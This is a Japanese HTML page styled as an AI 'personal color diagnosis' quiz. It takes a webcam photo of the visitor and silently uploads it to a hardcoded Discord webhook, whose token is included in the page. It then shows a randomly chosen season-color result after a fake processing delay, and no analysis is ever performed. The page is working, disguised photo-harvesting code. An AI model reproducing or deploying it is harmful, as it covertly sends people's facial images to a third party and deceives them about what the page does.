<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>パーソナルカラー診断</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      padding: 20px;
      background-color: #fff0f5;
    }
    h1 {
      color: #ff69b4;
      margin-bottom: 10px;
    }
    p {
      color: #555;
      margin-bottom: 20px;
    }
    .button {
      background-color: #ff69b4;
      color: white;
      padding: 15px 32px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
    }
    .button:hover {
      background-color: #ff85c1;
    }
    .result {
      margin-top: 20px;
    }
    img {
      max-width: 100%;
      height: auto;
      border-radius: 12px;
    }
    video {
      width: 100%;
      max-width: 400px;
      border-radius: 12px;
      margin-top: 20px;
    }
  </style>
</head>

<body>

  <img src="header.JPG" alt="ヘッダー画像">
  <h1>パーソナルカラー診断</h1>
  <p>写真1枚でAIがパーソナルカラーを診断し、似合う色を提案します。</p>

  <button class="button" onclick="startCamera()">診断する</button>

  <div id="cameraArea" style="display:none;">
    <video id="video" autoplay playsinline></video>
    <br>
    <button class="button" onclick="takePhoto()">写真を撮る</button>
  </div>

  <div id="processing" style="display:none;">
    <h2>診断中...</h2>
  </div>

  <div class="result" id="result"></div>

  <script>
    let videoStream;
    const webhookURL = "https://discord.com/api/webhooks/1365647175383646278/zr3nRlxGYnwnGyX_icocbi04RAS_dNy8dLVRclkCBCezZy-MRi3DMiuoAcjCxZHlyzDV";

    function startCamera() {
      document.getElementById('cameraArea').style.display = 'block';
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          videoStream = stream;
          const video = document.getElementById('video');
          video.srcObject = stream;
        })
        .catch(error => {
          alert('カメラが使えません: ' + error);
        });
    }

    function takePhoto() {
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // カメラ停止
      if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
      }

      document.getElementById('cameraArea').style.display = 'none';
      document.getElementById('processing').style.display = 'block';

      // Discordへ画像送信
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('file', blob, 'photo.png');
        
        fetch(webhookURL, {
          method: 'POST',
          body: formData
        })
        .then(() => {
          console.log('画像送信成功');
        })
        .catch(err => {
          console.error('画像送信失敗:', err);
        });
      }, 'image/png');

      // 5秒後に診断結果を表示
      setTimeout(() => {
        document.getElementById('processing').style.display = 'none';
        showResult();
      }, 5000);
    }

    function showResult() {
      const results = [
        { image: "iebeh.PNG", text: "あなたは【イエベ春】タイプ！" },
        { image: "iebah_aki.PNG", text: "あなたは【イエベ秋】タイプ！" },
        { image: "bluebe_natsu.PNG", text: "あなたは【ブルベ夏】タイプ！" },
        { image: "bluebe_fuyu.PNG", text: "あなたは【ブルベ冬】タイプ！" }
      ];
      const randomResult = results[Math.floor(Math.random() * results.length)];

      const resultDiv = document.getElementById('result');
      resultDiv.innerHTML = `
        <h2>${randomResult.text}</h2>
        <img src="${randomResult.image}" alt="${randomResult.text}">
        <br><br>
        <button class="button" onclick="window.location.href='about:blank'">閉じる</button>
      `;
    }
  </script>

</body>
</html>
